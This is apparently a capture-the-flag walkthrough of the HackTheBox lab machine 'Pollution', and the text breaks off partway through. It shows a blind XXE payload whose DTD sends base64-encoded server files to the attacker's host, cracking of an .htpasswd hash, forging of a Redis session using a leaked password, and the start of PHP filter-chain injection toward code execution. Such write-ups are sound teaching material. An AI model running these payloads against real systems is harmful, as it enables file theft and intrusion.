---
title: HTB: Pollution
url: https://0xdf.gitlab.io/2023/07/01/htb-pollution.html
date: 2023-07-01T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-pollution, ctf, hackthebox, debian, nmap, redis, redis-cli, feroxbuster, ffuf, subdomain, mybb, burp, burp-history-export, xxe, htpasswd, hashcat, source-code, php, lfi, php-filter-injection, php-fpm, fastcgi, express, nodejs, snyk, prototype-pollution, htb-updown, htb-encoding
---

![Pollution](/img/pollution-cover.png)

Pollution starts off with a website where I can find a token in a forum post that has a Burp history export attached. With that token, I can escalate my account to admin, and get access to an endpoint vulnerable to XML external entity (XXE) injection. With that, I’ll read files, including the source code for the site to get access to redis, where I’ll modify my state to get access to the developers site. That site has a PHP local file include (LFI) that I can exploit with filter injection to get code execution. This filter injection technique has become popular, but was relatively unknown at the time of Pollution’s release. I’ll pivot to the next user by exploiting PHP’s FastCGI Process Manager (PHP-FPM), where I’ll get access to the source code for a NodeJS / Express API in development. That API has a prototpye pollution vulnerability, which I can exploit to get execution and a shell as root. In beyond root, I take a quick look at the max length of a URL encountered during the XXE exploit.

## Box Info

| Name | [Pollution](https://hackthebox.com/machines/pollution)  [Pollution](https://hackthebox.com/machines/pollution) [Play on HackTheBox](https://hackthebox.com/machines/pollution) |
| --- | --- |
| Release Date | [03 Dec 2022](https://twitter.com/hackthebox_eu/status/1598302315055759360) |
| Retire Date | 01 Jul 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Pollution |
| Radar Graph | Radar chart for Pollution |
| First Blood User | 03:52:43[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 04:22:51[lynx lynx](https://app.hackthebox.com/users/2761) |
| Creator | [Tr1s0n Tr1s0n](https://app.hackthebox.com/users/575442) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and Redis (6379):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.192
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-27 17:47 EDT
Nmap scan report for 10.10.11.192
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
oxdf@hacky$ nmap -p 22,80,6379 -sCV 10.10.11.192
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-27 17:49 EDT
Nmap scan report for 10.10.11.192
Host is up (0.093s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Home
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 11 bullseye.

### Redis - TCP 6379

I can connect to Redis with `redis-cli` (`apt install redis`), but it doesn’t let me do anything without auth:

```

oxdf@hacky$ redis-cli -h 10.10.11.192
10.10.11.192:6379> keys *
(error) NOAUTH Authentication required.

```

### Website - TCP 80

#### Site

The page is a for a company with something about cleaning up pollution:

[![image-20230628150658135](/img/image-20230628150658135.png)](/img/image-20230628150658135.png)

[*Click for full image*](/img/image-20230628150658135.png)

There’s a contact section at the bottom that includes a domain and an email:

![image-20230628150720121](/img/image-20230628150720121.png)

I’ll register with the registration link and log in, which leads to `/home` . This page has a section with information about the API:

![image-20230628150834623](/img/image-20230628150834623.png)

#### Tech Stack

Any entered page address with an extension just redirects to `/`. Once logged in, it redirects to `/home`. The site is not running PHP or flat HTML, but something else.

The HTTP response headers don’t give much else besides knowing that the server is Apache:

```

HTTP/1.1 200 OK
Date: Tue, 18 Oct 2022 13:31:22 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 27777
Connection: close
Content-Type: text/html; charset=UTF-8

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.192 --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.192
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      169l      350w     4746c http://10.10.11.192/register
200      GET      169l      350w     4740c http://10.10.11.192/login
200      GET      541l     1413w    26197c http://10.10.11.192/
301      GET        9l       28w      313c http://10.10.11.192/assets => http://10.10.11.192/assets/
[####################] - 2m     60000/60000   0s      found:4       errors:363    
[####################] - 2m     30000/30000   219/s   http://10.10.11.192/ 
[####################] - 0s     30000/30000   0/s     http://10.10.11.192/assets/ => Directory listing (remove --dont-extract-links to scan)

```

In the latest version of `feroxbuster`, I’ll typically include `--dont-extract-links`, or else it will flood the page with images and other assets from the site that I can get just by examining the source.

Nothing interesting.

### Subdomain Fuzz

Given the use of domains, I’ll look for subdomains using `ffuf`:

```

oxdf@hacky$ /opt/ffuf/ffuf -u http://10.10.11.192 -H "Host: FUZZ.collect.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --mc all --ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.192
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.collect.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 431ms]
developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 93ms]
:: Progress: [4989/4989] :: Job [1/1] :: 249 req/sec :: Duration: [0:00:25] :: Errors: 0 ::

```

It finds `forum.collect.htb` and `developers.collect.htb`. I’ll add both of those along with `collect.htb` to my `/etc/hosts` file:

```
10.10.11.192 collect.htb forum.collect.htb developers.collect.htb

```

`collect.htb` loads the same site as by IP.

### forum.collect.htb

#### Site

`forum.collect.htb` has a single forum:

![image-20230628151635135](/img/image-20230628151635135.png)

The “Member List” link gives a list of potential user names:

![image-20230628153831861](/img/image-20230628153831861.png)

The forum has a bunch of posts:

![image-20230628151652418](/img/image-20230628151652418.png)

There is information in some of these threads:
- “Forum” says that this is for employees only.
- The “I had problems with the Pollution API” thread has a user complaining that it’s not working. In that thread, they post their Burp History. I’ll want to analyzed that.

  ![image-20230628152110282](/img/image-20230628152110282.png)

</picture>

#### Burp History

If I try to download `proxy_history.txt`, it redirects to this page that says I can’t because I’m not logged in:

![image-20230628152713034](/img/image-20230628152713034.png)

There’s a “Need to register?” link, and once I register, I can download the file.

The file is XML:

![image-20230628152841126](/img/image-20230628152841126.png)

The first 24 lines define the structure, and then there’s an `items` tag, with ten `item` tags in it. an `item` looks like:

```

  <item>
    <time>Thu Sep 22 18:29:46 BRT 2022</time>
    <url><![CDATA[http://detectportal.firefox.com/canonical.html]]></url>
    <host ip="34.107.221.82">detectportal.firefox.com</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[GET]]></method>
    <path><![CDATA[/canonical.html]]></path>
    <extension>html</extension>
    <request base64="true"><![CDATA[R0VUIC9jYW5vbmljYWwuaHRtbCBIVFRQLzEuMQ0KSG9zdDogZGV0ZWN0cG9ydGFsLmZpcmVmb3guY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogcHQtQlIscHQ7cT0wLjgsZW4tVVM7cT0wLjUsZW47cT0wLjMNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNClByYWdtYTogbm8tY2FjaGUNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    <status>200</status>
    <responselength>317</responselength>
    <mimetype>XML</mimetype>
    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54DQpDb250ZW50LUxlbmd0aDogOTANClZpYTogMS4xIGdvb2dsZQ0KRGF0ZTogVGh1LCAyMiBTZXAgMjAyMiAwOTowOToyNyBHTVQNCkFnZTogNDQ0NDkNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sDQpDYWNoZS1Db250cm9sOiBwdWJsaWMsbXVzdC1yZXZhbGlkYXRlLG1heC1hZ2U9MCxzLW1heGFnZT0zNjAwDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO3VybD1odHRwczovL3N1cHBvcnQubW96aWxsYS5vcmcva2IvY2FwdGl2ZS1wb3J0YWwiLz4=]]></response>
    <comment></comment>
  </item>

```

The `url` tag has the url for the request. The `request` and `response` tags have base64-encoded data that decodes to the request, for example:

```

GET /canonical.html HTTP/1.1
Host: detectportal.firefox.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Connection: close

```

The second `item` is a POST request to `http://collect.htb/set/role/admin`. The request is:

```

POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf

```

I’ll note both the `PHPSESSID` cookie and the `token`.

#### Tech Stack

The bottom says “Powered by MyBB”, which is a [bulletin board software](https://mybb.com/) written in PHP. There’s a lot of vulenrabilities in MyBB over time, but they all seem old and don’t match this version.

### developers.collect.htb

This site asks for HTTP auth on visiting:

![image-20221018101622894](/img/image-20221018101622894.png)

Not much else I can do here for now.

## Shell as www-data

### Get Admin Access

#### Set Session to Admin

I’ve got the request from the Burp History showing a request to `/set/role/admin` with a token in the POST body. Given that no user is identified, it seems likely that the user who is set as admin is the current user, and perhaps the `token` is what gives permission to do that.

I’ll try that same request, substituting my cookie for the one in the request:

```

oxdf@hacky$ curl -v http://collect.htb/set/role/admin -d token=ddac62a28254561001277727cb397baf --cookie "PHPSESSID=e0rr38ohgui9v9k7al982bf04d"
*   Trying 10.10.11.192:80...
* Connected to collect.htb (10.10.11.192) port 80 (#0)
> POST /set/role/admin HTTP/1.1
> Host: collect.htb
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: PHPSESSID=e0rr38ohgui9v9k7al982bf04d
> Content-Length: 38
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Wed, 28 Jun 2023 19:42:58 GMT
< Server: Apache/2.4.54 (Debian)
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: /admin
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host collect.htb left intact

```

The response is a 302 redirect to `/admin`, which seems to suggest it worked.

#### Admin Page

The admin page allows for me to register users for the API:

![image-20230628154343272](/img/image-20230628154343272.png)

On submitting, there’s a background request that’s a POST to `/api`:

```

POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 179
Origin: http://collect.htb
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=abkgib3l3npk6r1k2rinfn33ns
Pragma: no-cache
Cache-Control: no-cache

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>0xdf</username><password>0xdf</password></user></root>

```

It’s using XML to submit. The response has JSON status:

```

HTTP/1.1 200 OK
Date: Tue, 18 Oct 2022 17:40:09 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 15
Connection: close
Content-Type: application/json

{"Status":"Ok"}

```

### File Read

#### XXE POC

Any time I see XML submitted to a site I’ll want to check for XML External Entity (XXE) Injection. Because nothing I submit is displayed back in the response, this will be a blind injection. I’ll grab a proof of concept from [PayLoadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe):

```

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>

```

To merge this into the existing payload, I’ll send this POST to Burp Repeater and just add the middle three lines:

```

manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://10.10.14.6/xxe"> %ext;]><root><method>POST</method><uri>/auth/register</uri><user><username>0xdf</username><password>0xdf</password></user></root>

```

When I send this, the response returns that this user already exists, but there’s also a hit at my webserver:

```
10.10.11.192 - - [27/Jun/2023 18:32:26] code 404, message File not found
10.10.11.192 - - [27/Jun/2023 18:32:26] "GET /xxe HTTP/1.1" 404 -

```

This is successful XXE injection.

#### File Exfil

Looking at the next few payloads, I’ll build a payload that will load a DTD (Document Type Definition) file from my server. I’ll simply change the previous payload to request from `/xxe` to `xxe.dtd`.
*Warning: A lot of the payload examples will read `/etc/passwd`. I’d strongly recommend against this, at least for an initial POC. I’m going to be getting the contents, base64-encoding them, and then making an HTTP GET request back to myself with the results in a GET parameter. The problem with `/etc/passwd` is that the base64-encoded version may expand beyond the maximum URL length of some clients, which results in nothing coming back. While there is no standard for maximum URL length, PHP will fail here on `/etc/passwd`, which will make me think my payload is bad, when really it’s just not working on this file. `/etc/hostname` is a good alternative.*

I’ll create `xxe.dtd` to create a few more entities:

```

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.6/?%file;'>">
%eval;  
%exfil;

```

The first line creates a parameter called `file` that loads the base64-encoded contents of the file `/etc/hostname`.

The next line creates a parameter named `eval`, which has a dynamic definition of another entity, `exfil`. It then calls `%eval` to load it, thus loading `exfil`. Then it invokes `%exfil`, which causes the server to try to fetch that web resource. This will fail, but I’ll still get the request with the encoded data.

When I send the request again, there’s a request for `xxe.dtd`, and then the exfil:

```
10.10.11.192 - - [27/Jun/2023 18:34:54] "GET /xxe.dtd HTTP/1.1" 200 -
10.10.11.192 - - [27/Jun/2023 18:34:54] "GET /?cG9sbHV0aW9uCg== HTTP/1.1" 200 -

```

That has the hostname:

```

oxdf@hacky$ echo "cG9sbHV0aW9uCg==" | base64 -d
pollution

```

### Access Developers Site

#### collect.htb.conf

Knowing from enumeration that the server is Apache, I should expect to find the config files for each site in `/etc/apache2/sites-enabled/`. `default.conf` and `000-default.conf` are some default names to check for, but they both come up empty. It’s common to name the config files after the site names. Fetching `collect.htb.conf` works:

```
10.10.11.192 - - [27/Jun/2023 18:59:33] "GET /xxe.dtd HTTP/1.1" 200 -
10.10.11.192 - - [27/Jun/2023 18:59:34] "GET /?PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJU2VydmVyTmFtZSBjb2xsZWN0Lmh0YgoJRG9jdW1lbnRSb290IC92YXIvd3d3L2NvbGxlY3QvcHVibGljCgoJIyBBdmFpbGFibGUgbG9nbGV2ZWxzOiB0cmFjZTgsIC4uLiwgdHJhY2UxLCBkZWJ1ZywgaW5mbywgbm90aWNlLCB3YXJuLAoJIyBlcnJvciwgY3JpdCwgYWxlcnQsIGVtZXJnLgoJIyBJdCBpcyBhbHNvIHBvc3NpYmxlIHRvIGNvbmZpZ3VyZSB0aGUgbG9nbGV2ZWwgZm9yIHBhcnRpY3VsYXIKCSMgbW9kdWxlcywgZS5nLgoJI0xvZ0xldmVsIGluZm8gc3NsOndhcm4KCglFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKCUN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCgoJIyBGb3IgbW9zdCBjb25maWd1cmF0aW9uIGZpbGVzIGZyb20gY29uZi1hdmFpbGFibGUvLCB3aGljaCBhcmUKCSMgZW5hYmxlZCBvciBkaXNhYmxlZCBhdCBhIGdsb2JhbCBsZXZlbCwgaXQgaXMgcG9zc2libGUgdG8KCSMgaW5jbHVkZSBhIGxpbmUgZm9yIG9ubHkgb25lIHBhcnRpY3VsYXIgdmlydHVhbCBob3N0LiBGb3IgZXhhbXBsZSB0aGUKCSMgZm9sbG93aW5nIGxpbmUgZW5hYmxlcyB0aGUgQ0dJIGNvbmZpZ3VyYXRpb24gZm9yIHRoaXMgaG9zdCBvbmx5CgkjIGFmdGVyIGl0IGhhcyBiZWVuIGdsb2JhbGx5IGRpc2FibGVkIHdpdGggImEyZGlzY29uZiIuCgkjSW5jbHVkZSBjb25mLWF2YWlsYWJsZS9zZXJ2ZS1jZ2ktYmluLmNvbmYKPC9WaXJ0dWFsSG9zdD4KCiMgdmltOiBzeW50YXg9YXBhY2hlIHRzPTQgc3c9NCBzdHM9NCBzciBub2V0Cg== HTTP/1.1" 200 -

```

The config itself (with the default comments snipped) is unremarkable:

```

<VirtualHost *:80>
...[snip]...
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        ServerName collect.htb
        DocumentRoot /var/www/collect/public
...[snip]...

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...[snip]...
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

#### forum.collect.htb.conf

I’ll fetch the `forum.collect.htb.conf` config, and there’s not much interesting in here either:

```

<VirtualHost *:80>
...[snip]...
        ServerAdmin webmaster@localhost
        ServerName forum.collect.htb
        DocumentRoot /var/www/forum/
...[snip]...

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...[snip]...
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

It does give the full path to the web root.

#### developers.collect.htb.conf

Updating the DTD file one more time to get the `developers.collect.htb.conf` file, this one has a bit more:

```

<VirtualHost *:80>
...[snip]...
        ServerAdmin collect@localhost
        ServerName developers.collect.htb
        DocumentRoot /var/www/developers/public
...[snip]...

        <Directory "/var/www/developers">
                AuthType Basic
                AuthName "Restricted Content"
                AuthUserFile /var/www/developers/public/.htpasswd
                Require valid-user
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...[snip]...
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

In addition to defining the server name and the document root, it defines the restriction that requires creds to get to the site. The credentials are stored in `/var/www/developers/public/.htpasswd`.

I’ll fetch that file:

```
10.10.11.192 - - [27/Jun/2023 19:00:54] "GET /xxe.dtd HTTP/1.1" 200 -
10.10.11.192 - - [27/Jun/2023 19:00:54] "GET /?ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg== HTTP/1.1" 200 -

```

It decodes to a username and hash:

```

oxdf@hacky$ echo "ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg==" | base64 -d
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1

```

#### Crack Hash

I’ll feed that hash to `hashcat` and it detects the hash type, and cracks it very quickly:

```

$ hashcat developers_group.hash /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
...[snip]...
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1:r0cket
...[snip]...

```

Now visiting the site with that username / password grants access.

### Access Developers Site Auth

#### Enumeration

With creds, the site is now just a login form:

![image-20221018152923776](/img/image-20221018152923776.png)

It seems that the first password is to allow only the developers group access, but each person still needs their own auth.

My creds from the first site don’t work, popping a message box and then redirecting back to the login form:

![image-20221018153004191](/img/image-20221018153004191.png)

None of the other passwords I’ve collected so far work with some basic guessing of names.

#### PHP Source

I’ll exfil the source code for `index.php` from the `developers` directory:

```

<?php
require './bootstrap.php';

if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
    die(header('Location: /login.php'));
}

if (!isset($_GET['page']) or empty($_GET['page'])) {
    die(header('Location: /?page=home'));
}

$view = 1;
?>
    
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="assets/js/tailwind.js"></script>
    <title>Developers Collect</title>
</head>

<body>
    <div class="flex flex-col h-screen justify-between">
        <?php include("header.php"); ?>
        
        <main class="mb-auto mx-24">
            <?php include($_GET['page'] . ".php"); ?>
        </main>

        <?php include("footer.php"); ?>
    </div>

</body>

```

It checks at the top for `auth` in my current session. There’s also a pretty clear local file include (LFI) if I can get authenticated, as `$_GET['page'] . ".php"` is included without filtering.

At the top, it loads `bootstrap.php` with the `require` directive. This file defines the session storage as Redis:

```

<?php

ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://localhost:6379/?auth=COLLECTR3D1SPASS');

session_start();

```

It also has the creds!

#### Update Cookie

Now I can connect to Redis with the password and access the session cookies it is holding:

```

oxdf@hacky$ redis-cli -h collect.htb -a 'COLLECTR3D1SPASS'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
collect.htb:6379> KEYS *
1) "PHPREDIS_SESSION:r3ra988ri194fe9gtang4g6qvj"
2) "PHPREDIS_SESSION:e0rr38ohgui9v9k7al982bf04d"
3) "PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr"
4) "PHPREDIS_SESSION:nkrdub5ejsh4udkmg16fktbse7"
5) "PHPREDIS_SESSION:jhnv5hrpr9cp3b7mv1dt7fkiei"
6) "PHPREDIS_SESSION:0fksesb1irpcrmoimuqru7vog2"

```

My cookie in Firefox for `developers.collect.htb` is `7irvg47mvbp0lumhheo3auijsr`, which is the third one. These sessions are flushed frequently, but I can get them back into Redis by logging into the main site or failing to login on the dev site.

I can view the data for that key and it’s empty:

```

collect.htb:6379> GET PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr
""

```

None of the other keys have data either, except the one associated with my session on the main site:

```

collect.htb:6379> GET PHPREDIS_SESSION:e0rr38ohgui9v9k7al982bf04d
"username|s:4:\"0xdf\";role|s:5:\"admin\";"

```

That’s serialized PHP data, which looks like:
- `username` key:
  - `s` = string type
  - 4 bytes long
  - value of “0xdf”
- `role` key
  - `s` = string type
  - 5 bytes long
  - value of “admin”

I know that PHP is looking for an array value named `auth` and failing if it is not set or not `True`:

```

if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {            
    die(header('Location: /login.php'));                                 
}    

```

I can get very similar looking serialized data in a PHP terminal:

```

oxdf@hacky$ php -a
Interactive shell 
php > $x = array("username" => "0xdf", "role" => "admin");
php > echo serialize($x);
a:2:{s:8:"username";s:4:"0xdf";s:4:"role";s:5:"admin";}

```

Because the check if `$_SESSION['auth'] != True` with only one `=`, the types don’t have to match, so I can use a string with any non-empty value:

```

collect.htb:6379> set PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr "auth|s:1:\"1\";"
OK

```

Alternatively, I can make a boolean value. In PHP:

```

php > $x = array("username" => "0xdf", "role" => "admin", "auth" => True);
php > echo serialize($x);
a:3:{s:8:"username";s:4:"0xdf";s:4:"role";s:5:"admin";s:4:"auth";b:1;}

```

There’s no length, just the type of `b` and the value of `1` for True. So in Redis I can:

```

collect.htb:6379> set PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr "auth|b:1;"
OK

```

With either of these set with my cookie, visiting `developers.collect.htb` redirects to `/?page=home` which loads:

![image-20230628172310148](/img/image-20230628172310148.png)

### RCE Via Filter Injection

#### Enumeration

The site doesn’t have anything interesting on it.

I already noted the LFI vulnerability is here:

```

<main class="mb-auto mx-24">
    <?php include($_GET['page'] . ".php"); ?>
</main>

```

It is taking user input and passing that to `include`. I can use this to read files across the file system, but only if they end in `.php`. This exploit gives me access to the source for the site (using PHP filters), but nothing I couldn’t already access with the XXE.

#### Background

When Pollution was released, the PHP filter injection technique was not at all well known. Many in the community learned of it by playing Pollution. Since then, I’ve shown it as an [unintended for UpDown](/2023/01/21/htb-updown.html#beyond-root---lfi2rce-via-php-filters) and the intended path for [Encoding](/2023/04/15/htb-encoding.html#lfi---rce). The UpDown post has a lot of detail, and [this video](https://www.youtube.com/watch?v=TnLELBtmZ24) goes into detail explaining it:

The short version is that I will stack filters in such a way that they generate bits of data, and with enough, can actually write the page I want to get included, which will be a simple webshell. It’s a super creative and cool technique.

#### POC

I’ll use the [script from Synacktiv](https://github.com/synacktiv/php_filter_chain_generator) to generate a payload. I can start with a simple `echo` to make sure it’s working:

```

oxdf@hacky$ python php_filter_chain_generator.py --chain '<?php echo "0xdf was here"; ?>'
[+] The following gadget chain will generate the following code : <?php echo "0xdf was here"; ?> (base64 value: PD9waHAgZWNobyAiMHhkZiB3YXMgaGVyZSI7ID8+)
